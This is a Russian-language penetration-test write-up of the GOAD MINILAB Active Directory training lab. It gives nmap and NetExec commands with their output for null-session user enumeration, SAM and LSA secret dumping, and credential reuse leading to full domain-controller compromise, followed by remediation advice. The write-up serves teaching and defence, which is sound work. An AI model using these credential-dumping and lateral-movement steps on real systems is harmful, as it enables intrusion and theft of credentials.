# GOAD MINILAB — Writeup пентеста Active Directory

*[🇬🇧 English](./WRITEUP.en.md) · [🇺🇦 Українська](./WRITEUP.ua.md)*

## Обзор

| | |
|---|---|
| **Лаборатория** | GOAD MINILAB (Game Of Active Directory) |
| **Домен** | `mini.lab` (NetBIOS: `MINILAB`) |
| **Дата** | Октябрь 2026 |
| **Цель** | Полная компрометация домена |
| **Результат** | ✅ Достигнуто — доступ администратора на Domain Controller |

## Топология лаборатории

| Хост | IP | Роль | ОС |
|---|---|---|---|
| DC01 | `192.168.56.30` | Контроллер домена | Windows Server 2019 (Build 17763) |
| WS01 | `192.168.56.31` | Рабочая станция в домене | Windows 10 (Build 19041) |

## Краткая цепочка атаки

```
Анонимная SMB-энумерация (Null Session)
        │
        ▼
Пароль найден в поле "description" через SMB (bob:superman)
        │
        ▼
Локальные права администратора на WS01 (bob)
        │
        ▼
Дамп SAM / LSA secrets на WS01
        │
        ▼
Найден пароль в открытом виде: vagrant:vagrant
        │
        ▼
Повторное использование кредов на DC01 (vagrant:vagrant)
        │
        ▼
vagrant найден в локальной группе "Administrators" на DC01
        │
        ▼
Полный контроль над Domain Controller (R/W файловой системы, выполнение кода)
```

---

## 1. Разведка

### 1.1 Сканирование портов

```bash
nmap -sV -sC -Pn 192.168.56.30
```

**DC01 — ключевые находки:**

| Порт | Сервис | Примечание |
|---|---|---|
| 53 | DNS | Simple DNS Plus |
| 88 | Kerberos | — |
| 389/3268 | LDAP / Global Catalog | Домен: `mini.lab` |
| 445 | SMB | — |
| 3389 | RDP | NetBIOS-домен `MINILAB` подтверждён через `rdp-ntlm-info` |

```bash
nmap -sV -sC -Pn 192.168.56.31
```

**WS01 — ключевые находки:**

| Порт | Сервис | Примечание |
|---|---|---|
| 135/139/445 | RPC/SMB | SMB signing **не обязателен** (в отличие от DC, где принудительный) |
| 3389 | RDP | Подтверждает членство в домене (`MINILAB`) |

### 1.2 Анонимная SMB-энумерация

Обнаружено, что на контроллере домена включена SMB Null Session:

```bash
nxc smb 192.168.56.30 -u '' -p '' --users
```

```
[*] ... (Null Auth:True) (DC:True)
-Username-    -Last PW Set-         -Description-
Guest         <never>               Built-in account for guest access...
bob           2026-10-19 17:32:30   (Password : superman)
dave          2026-10-19 17:32:54   -
```

**🔴 Находка №1 — Раскрытие пароля через поле description SMB**

Пароль пользователя `bob` в открытом виде (`superman`) хранился прямо в атрибуте `description` учётной записи AD, доступном для чтения через неаутентифицированное (null session) SMB-соединение.

---

## 2. Первоначальный доступ — WS01

Креды `bob:superman` проверены на WS01:

```bash
nxc smb 192.168.56.31 -u bob -p superman
```

```
[+] mini.lab\bob:superman (Pwn3d!)
```

Пометка `(Pwn3d!)` подтверждает **права локального администратора** для `bob` на WS01.

### 2.1 Доступ к SYSVOL

С кредами `bob` получен доступ к шаре SYSVOL и извлечены файлы групповых политик:

```bash
smbclient //192.168.56.30/SYSVOL -U "bob%superman"
```

Security-шаблоны GPO (`GptTmpl.inf`) извлечены для офлайн-анализа — уязвимых Group Policy Preferences (`cpassword`) в данной среде не обнаружено.

### 2.2 Дамп SAM-хешей (WS01)

```bash
nxc smb 192.168.56.31 -u bob -p superman --sam
```

```
Administrator:500:...:89ca5bc62cb5f27bd58c292baaf45603:::
```

Получен NTLM-хеш локального Administrator — кандидат для офлайн-взлома / Pass-the-Hash.

### 2.3 Дамп LSA Secrets (WS01)

```bash
nxc smb 192.168.56.31 -u bob -p superman --lsa
```

```
vagrant:vagrant
dpapi_machinekey:8d9daa0c2db485f9c27249cba67e2e622cfbc290
dpapi_userkey:458929a0ee85af08110d395c0a12208e47572eca
```

**🔴 Находка №2 — Открытые креды в LSA secrets**

Пара кредов `vagrant:vagrant` (оставленный провижининг-аккаунт Vagrant) была восстановлена **в открытом виде** из хранилища LSA secrets на WS01.

---

## 3. Эскалация привилегий — повторное использование кредов на DC01

Восстановленные креды `vagrant:vagrant` проверены напрямую на контроллере домена:

```bash
nxc smb 192.168.56.30 -u vagrant -p vagrant
```

```
[+] mini.lab\vagrant:vagrant (Pwn3d!)
```

Подтверждён полный доступ на чтение/запись к административным шарам:

```bash
nxc smb 192.168.56.30 -u vagrant -p vagrant --shares
```

```
ADMIN$    READ,WRITE    Remote Admin
C$        READ,WRITE    Default share
NETLOGON  READ,WRITE    Logon server share
SYSVOL    READ,WRITE    Logon server share
```

**🔴 Находка №3 — Повторное использование кредов между хостами домена**

Аккаунт `vagrant`, изначально восстановленный с рабочей станции (WS01), оказался валидным с полными правами администратора на самом контроллере домена (DC01).

### 3.1 Анализ источника привилегий

Проверено членство в группах для определения точного источника повышенных прав `vagrant`:

```bash
net rpc group members "Domain Admins" -U "vagrant%vagrant" -S 192.168.56.30
```
```
MINILAB\Administrator
MINILAB\alice
MINILAB\carol
```

`vagrant` **не является** членом `Domain Admins`. Дальнейшая проверка локальной группы `Administrators` на DC01:

```bash
nxc ldap 192.168.56.30 -u vagrant -p vagrant --groups "Administrators" -o GROUP="Administrators"
```
```
Administrator
vagrant
Enterprise Admins
Domain Admins
```

**Первопричина подтверждена:** `vagrant` был добавлен напрямую в **локальную группу `Administrators` на контроллере домена** — не через группу безопасности `Domain Admins`. На контроллере домена права локального администратора фактически эквивалентны полной компрометации домена (возможны DCSync, изменение GPO, создание новых аккаунтов Domain Admin), поскольку DC не имеет отдельной локальной SAM-базы, независимой от AD.

---

## 4. Первопричина и влияние

| | |
|---|---|
| **Первопричина** | Провижининг-аккаунт (`vagrant`) оставлен в локальной группе `Administrators` на DC после настройки инфраструктуры |
| **Способствующий фактор** | Хранение пароля в открытом виде в поле description SMB (`bob`) |
| **Способствующий фактор** | Повторное использование пароля между хостами (`vagrant:vagrant` на WS01 и DC01) |
| **Влияние** | Полная компрометация домена Active Directory `mini.lab` |

## 5. Рекомендации по устранению

1. **Никогда не хранить креды в атрибутах AD** (description, notes и т.д.) — внедрить периодические LDAP-аудиты.
2. **Удалять провижининг/деплой-аккаунты** из привилегированных групп после завершения настройки инфраструктуры.
3. **Использовать уникальные, сильные пароли** для каждого хоста/сервиса — устранить повторное использование паролей через менеджер паролей или управляемые service-аккаунты (gMSA).
4. **Отключить SMB Null Sessions** (настройки реестра `RestrictAnonymous`), чтобы предотвратить неаутентифицированную энумерацию.
5. **Принудительно применить SMB signing** на всех хостах домена, не только на DC.
6. **Регулярно аудировать членство в локальной группе `Administrators`** на всех присоединённых к домену системах, особенно на контроллерах домена.

---

## Использованные инструменты

- `nmap` — сетевая разведка
- [NetExec (nxc)](https://github.com/Pennyw0rth/NetExec) — SMB/LDAP энумерация, проверка кредов, дамп SAM/LSA
- `smbclient` — просмотр шар и загрузка файлов
- [Impacket](https://github.com/fortra/impacket) — набор инструментов для Kerberos/SMB
- `net rpc` (Samba) — энумерация членства в группах

## Среда лаборатории

Построено на [GOAD (Game Of Active Directory)](https://github.com/Orange-Cyberdefense/GOAD) от Orange Cyberdefense — конфигурация MINILAB (провайдер VirtualBox).

---

*Этот writeup документирует активность, выполненную исключительно против изолированной, намеренно уязвимой учебной лаборатории в образовательных целях.*
